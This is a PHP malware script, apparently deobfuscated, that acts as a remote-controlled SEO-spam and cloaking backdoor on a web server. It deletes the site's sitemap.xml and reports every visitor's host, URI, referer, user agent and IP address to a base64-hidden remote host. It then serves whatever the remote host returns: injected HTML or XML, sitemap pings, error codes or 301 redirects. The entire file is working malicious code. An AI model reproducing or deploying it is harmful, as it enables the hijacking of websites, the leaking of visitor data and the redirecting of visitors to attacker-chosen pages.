<?php

@set_time_limit(0);
@error_reporting(0);
@ignore_user_abort(1);
if (isset($_SERVER["DOCUMENT_ROOT"])) {
    $mP9ad = $_SERVER["DOCUMENT_ROOT"];
    goto gYj3J;
}
$mP9ad = "/var/www/html";
gYj3J:
if (!file_exists($bHMLW = $mP9ad . "/sitemap.xml")) {
    goto Qzcol;
}
@unlink($bHMLW);
Qzcol:
$TrtMt = "ejRob25yLmJlbm5lY2RtLnRvcA==";
$Qubsc = "http";
if (lzhzm()) {
    $Qubsc = "https";
    goto w3Vn2;
}
$Qubsc = "http";
w3Vn2:
$S_J3t = urlencode(bcWGj());
$epFJX = urldecode(base64_decode($TrtMt));
$IWWo7 = urlencode(@$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
$oR1F1 = urlencode($_SERVER["HTTP_HOST"]);
$IWWo7 = urlencode($IWWo7);
$Dy9yW = '';
if (!isset($_SERVER["HTTP_REFERER"])) {
    goto V_ZJF;
}
$Dy9yW = $_SERVER["HTTP_REFERER"];
V_ZJF:
$Dy9yW = urlencode($Dy9yW);
$LNw0J = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));
$CV8EJ = urlencode(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : '');
$PGXWy = "http://" . $epFJX . "/indexone.php?my_host=" . $oR1F1 . "&my_uri=" . $S_J3t . "&my_lang=" . $IWWo7 . "&my_origin=" . $Dy9yW . "&http_type=" . $Qubsc . "&my_agent=" . $LNw0J . "&my_id=" . $CV8EJ;
$uNZhe = trim(UAxkF($PGXWy));
if (strstr($uNZhe, "notdoanything")) {
    goto DnKCk;
}
if (strstr($uNZhe, "echohtmlcontent")) {
    @header("Content-type: text/html; charset=utf-8");
    $uNZhe = str_replace("echohtmlcontent", '', $uNZhe);
    echo $uNZhe;
    exit;
}
if (strstr($uNZhe, "echoxmlcontent")) {
    $uNZhe = str_replace("echoxmlcontent", '', $uNZhe);
    @header("Content-type: text/xml");
    echo trim($uNZhe);
    exit;
}
if (strstr($uNZhe, "echopingxmlcontent")) {
    $uNZhe = str_replace("echopingxmlcontent", '', $uNZhe);
    @header("Content-type: text/html; charset=utf-8");
    echo sBERL($uNZhe);
    exit;
}
if (strstr($uNZhe, "echo500pagecontent")) {
    @header("HTTP/1.1 500 Internal Server Error");
    exit;
}
if (strstr($uNZhe, "echo404pagecontent")) {
    @header("HTTP/1.1 404 Not Found");
    exit;
}
if (!strstr($uNZhe, "echo301pagecontent")) {
    DnKCk:
    function LZhZm()
    {
        if (isset($_SERVER["HTTPS"]) && strtolower($_SERVER["HTTPS"]) !== "off") {
            return true;
        }
        if (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] === "https") {
            return true;
        }
        if (isset($_SERVER["HTTP_FRONT_END_HTTPS"]) && strtolower($_SERVER["HTTP_FRONT_END_HTTPS"]) !== "off") {
            return true;
        }
        Yil7B:
        return false;
    }
    function bCWgj()
    {
        if (isset($_SERVER["REQUEST_URI"])) {
            $S_J3t = $_SERVER["REQUEST_URI"];
            goto u_NTT;
        }
        if (isset($_SERVER["argv"])) {
            $S_J3t = $_SERVER["PHP_SELF"] . "?" . $_SERVER["argv"][0];
            goto zDE3q;
        }
        $S_J3t = $_SERVER["PHP_SELF"] . "?" . $_SERVER["QUERY_STRING"];
        zDE3q:
        u_NTT:
        return $S_J3t;
    }
    function UaXkF($PGXWy)
    {
        $ZcZf9 = '';
        $ZcZf9 = @file_get_contents($PGXWy);
        if ($ZcZf9) {
            goto DoZZ5;
        }
        $WAFeu = curl_init();
        curl_setopt($WAFeu, CURLOPT_URL, $PGXWy);
        curl_setopt($WAFeu, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($WAFeu, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($WAFeu, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($WAFeu, CURLOPT_CONNECTTIMEOUT, 30);
        $ZcZf9 = curl_exec($WAFeu);
        curl_close($WAFeu);
        DoZZ5:
        return $ZcZf9;
    }
    function sbeRL($uNZhe)
    {
        $bJIeR = explode("#####", trim($uNZhe));
        $f3T6k = '';
        foreach ($bJIeR as $Cm0h4) {
            $GvbQT = uaXkf($Cm0h4);
            $g9PBd = strpos($GvbQT, "Sitemap Notification Received") !== false ? "OK" : "ERROR";
            $oopRy .= $Cm0h4 . " ===> " . $g9PBd . "<br>";
        }
        return $oopRy;
    }
    // [PHPDeobfuscator] Implied script end
    return;
}
@header("HTTP/1.1 301 Moved Permanently");
$uNZhe = str_replace("echo301pagecontent", '', $uNZhe);
header("Location: " . $uNZhe);
exit;
